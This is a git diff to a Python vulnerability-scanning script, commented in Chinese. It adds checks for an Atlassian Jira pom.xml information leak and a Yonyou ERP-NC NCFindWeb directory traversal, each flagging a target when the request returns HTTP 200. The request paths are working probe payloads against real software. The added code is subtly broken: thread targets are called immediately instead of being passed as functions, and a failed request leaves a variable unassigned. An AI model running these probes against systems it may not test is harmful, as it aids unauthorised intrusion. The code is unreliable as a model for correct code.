@@ -1,3 +1,4 @@
+
 import requests
 import os
 import threading
@@ -128,20 +129,28 @@ def twelve():#蓝海卓越计费管理系统任意文件读取
         print(url+"\033[34m可能存在蓝海卓越计费管理系统任意文件读取\033[0m")
     else:
         pass
+def thirteen():#可能存在Atlassian Jira 敏感信息泄漏漏洞
+    url1 = "http://" + url + "/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
+    try:
+        url2 = requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code == 200:
+        print(url + "\033[34m可能存在Atlassian Jira 敏感信息泄漏漏洞\033[0m")
+    else:
+        pass
 
-# def main():   所有poc汇总
-#     one()
-#     two()
-#     three()
-#     four()
-#     five()
-#     six()
-#     seven()
-#     eight()
-#     nine()
-#     ten()
-#     eleven()
-#     twelve()
+def fourteen():#用友ERP-NC 目录遍历漏洞
+    url1 = "http://" + url + "/NCFindWeb?service=IPreAlertConfigService&filename="
+    try:
+        url2 = requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code == 200:
+        print(url + "\033[34m可能存在用友ERP-NC 目录遍历漏洞\033[0m")
+    else:
+        pass
+
 def main(): #多线程主函数
     threads = [threading.Thread(target=one),
               threading.Thread(target=two),
@@ -155,6 +164,8 @@ def main(): #多线程主函数
               threading.Thread(target=ten),
               threading.Thread(target=eleven),
               threading.Thread(target=twelve),
+              threading.Thread(target=thirteen()),
+              threading.Thread(target=fourteen())
               ]
     for t in threads:
         # 启动线程
@@ -181,5 +192,3 @@ elif urlinput=="2":
         if not url:
             break
             file.close()
-
-
